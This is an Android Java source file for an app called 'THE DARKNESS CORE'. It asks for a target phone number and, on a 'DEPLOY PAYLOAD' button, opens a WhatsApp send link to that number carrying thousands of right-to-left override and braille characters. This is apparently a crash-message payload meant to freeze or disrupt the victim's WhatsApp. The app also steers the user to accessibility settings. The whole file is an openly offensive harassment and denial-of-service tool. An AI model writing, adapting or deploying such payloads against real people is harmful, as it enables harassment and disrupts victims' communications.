package com.otax.clone;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.*;
import android.graphics.Color;
import androidx.appcompat.app.AppCompatActivity;
import com.bumptech.glide.Glide;
import android.widget.ImageView;
import android.view.ViewGroup;
import android.widget.FrameLayout;

public class MainActivity extends AppCompatActivity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        FrameLayout frame = new FrameLayout(this);
        ImageView bgImage = new ImageView(this);
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
        bgImage.setLayoutParams(params);
        bgImage.setScaleType(ImageView.ScaleType.CENTER_CROP);
        frame.addView(bgImage);
        
        Glide.with(this).asGif().load(R.drawable._687c046adc7afe8e5abae1d2bd148d95__1_).into(bgImage);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(1);
        l.setPadding(50,100,50,50);

        TextView t = new TextView(this);
        t.setText("THE DARKNESS CORE\n\n1. Allow Access\n2. Input Target\n3. Deploy");
        t.setTextColor(Color.WHITE);
        t.setTextSize(18f);
        l.addView(t);

        EditText in = new EditText(this);
        in.setHint("Target Number (62xxx)");
        in.setTextColor(Color.WHITE);
        l.addView(in);

        Button acc = new Button(this);
        acc.setText("1. ALLOW ACCESS");
        acc.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        l.addView(acc);

        Button att = new Button(this);
        att.setText("DEPLOY PAYLOAD");
        att.setOnClickListener(v -> {
            String payload = "\u202e".repeat(1000) + "⣿".repeat(2000);
            String url = "whatsapp://send?phone=" + in.getText().toString() + "&text=" + Uri.encode(payload);
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
        });
        l.addView(att);
        frame.addView(l);
        setContentView(frame);
    }
                               }
